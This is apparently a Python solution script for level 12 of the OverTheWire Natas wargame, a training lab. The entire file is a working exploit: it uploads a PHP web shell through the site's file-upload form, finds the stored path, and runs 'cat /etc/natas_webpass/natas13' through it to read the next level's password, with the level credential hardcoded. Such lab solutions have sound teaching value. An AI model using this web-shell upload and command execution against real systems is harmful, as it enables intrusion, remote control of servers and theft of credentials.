import requests
import re
requests.packages.urllib3.disable_warnings()

url = "http://natas12.natas.labs.overthewire.org/"

s = requests.session()

def exp():

    natas_php = "<?php system($_GET['cmd']); ?>"

    shell = {
        "uploadedfile": ("shell.php", natas_php, "application/octet-stream")
    }

    data_post = {
        "filename": "shell.php",
        "MAX_FILE_SIZE": "1000",
        "submit": "Upload File"
    }

    r = s.post(url, auth=('natas12', 'yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'), verify=False, files=shell, data=data_post)
    if r.status_code == 200:
        get_shell = re.search(r"upload/\w+.php", r.text).group(0)
        return get_shell
    
def rce():
    shell = exp()
    r = s.get(url + shell, auth=('natas12', 'yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB'), verify=False, params={'cmd': 'cat /etc/natas_webpass/natas13'})
    if r.status_code == 200:
        print("Password for natas13: " + r.text)

if __name__ == '__main__':
    exp()
    rce()